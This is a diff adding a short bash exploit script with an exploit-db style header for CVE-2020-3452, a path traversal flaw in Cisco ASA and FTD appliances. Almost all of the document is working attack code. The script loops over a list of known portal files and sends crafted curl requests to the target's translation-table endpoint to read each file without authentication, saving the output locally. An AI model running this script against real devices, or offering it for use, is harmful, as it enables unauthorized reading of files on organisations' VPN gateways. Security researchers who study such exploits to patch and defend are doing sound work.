@@ -1,0 +1,25 @@
+# Exploit Title: Cisco ASA and FTD 9.6.4.42 - Path Traversal
+# Date: 2020-10-10
+# Exploit Author: 3ndG4me
+# Vendor: www.cisco.com
+# Product: https://www.cisco.com/c/en/us/products/security/asa-firepower-services/index.html
+# CVE : CVE-2020-3452
+
+
+
+TARGET=$1
+CISCO_KNOWN_FILES="logo.gif http_auth.html user_dialog.html localization_inc.lua portal_inc.lua include nostcaccess.html ask.html no_svc.html svc.html session.js useralert.html ping.html help app_index.html tlbr portal_forms.js logon_forms.js win.js portal.css portal.js sess_update.html blank.html noportal.html portal_ce.html portal.html home logon_custom.css portal_custom.css preview.html session_expired custom portal_elements.html commonspawn.js common.js appstart.js appstatus relaymonjar.html relaymonocx.html relayjar.html relayocx.html portal_img color_picker.js color_picker.html cedhelp.html cedmain.html cedlogon.html cedportal.html cedsave.html cedf.html ced.html lced.html files 041235123432C2 041235123432U2 pluginlib.js shshim do_url clear_cache connection_failed_form apcf ucte_forbidden_data ucte_forbidden_url cookie session_password.html tunnel_linux.jnlp tunnel_mac.jnlp sdesktop gp-gip.html auth.html wrong_url.html logon_redirect.html logout.html logon.html test_chargen"
+mkdir cisco_asa_files
+
+if [ -z "$1" ];
+then
+    echo "Usage: cve-2020-3452.sh <target ip/hostname>"
+    echo "Example: cve-2020-3452.sh mytarget.com"
+    echo "Files that are downloaded will be in the newly created 'cisco_asa_files' directory"
+    echo "Target not specificed...exiting..."
+else
+    for FILE in $CISCO_KNOWN_FILES;
+    do
+        curl "https://$TARGET/+CSCOT+/translation-table?type=mst&textdomain=%2bCSCOE%2b/${FILE}&default-language&lang=../" | tee cisco_asa_files/$FILE;
+    done
+fi
